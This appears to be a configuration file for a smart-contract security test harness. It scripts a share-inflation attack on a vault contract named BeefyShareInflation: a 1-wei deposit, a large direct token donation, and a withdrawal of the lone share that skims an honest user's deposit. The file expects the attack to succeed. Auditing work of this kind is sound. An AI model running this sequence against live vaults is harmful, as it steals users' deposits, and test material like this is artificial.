contract: targets/tier_h_audit/BeefyShareInflation.sol
contract_name: BeefyShareInflation
deploy_value_wei: 0
deploy_args:
  - "@@A"

tokens:
  - name: A
    decimals: 18
    initial_balances:
      Attacker:   100_000_000_000_000_000_000_000    # 100k A (1 wei deposit + huge donate)
      HonestUser:  10_000_000_000_000_000_000_000    # 10k A normal-size deposit

roles:
  - name: Attacker
    initial_eth_wei: 1_000_000_000_000_000_000_000
    primary_asset: A
    callable_functions: [deposit, withdraw, "A.transfer"]
  - name: HonestUser
    initial_eth_wei: 1_000_000_000_000_000_000_000
    primary_asset: A
    callable_functions: [deposit]

honest_strategies:
  Attacker:
    actions: []
  HonestUser:
    actions:
      - { function: deposit, args: { amt: 10_000_000_000_000_000_000_000 }, phase: 2 }   # honest user deposits after attacker setup

mutator_hints:
  Attacker:
    try_self_targeting: false
    try_skip_actions: false
    try_action_insertion: false
    try_numeric_mutation: false
    try_compound_pair_insertion: false
    max_candidates_per_role: 300
    compound_template:
      - fn: deposit
        phase: 0
        values: [1]                                # 1 wei seed
      - fn: "A.transfer"
        phase: 1
        args:
          to: "@@self"
          amount: 50_000_000_000_000_000_000_000  # donate 50k A
      - fn: withdraw
        phase: 3
        values: [1]                                # withdraw the 1 share — collects inflated underlying
  HonestUser:
    try_self_targeting: false
    try_skip_actions: false

expected_findings:
  - role: Attacker
    deviation_must_contain: [deposit, "A.transfer", withdraw]
    payoff_higher_than_honest: true
    min_payoff_diff_wei: 1_000_000_000_000_000_000_000
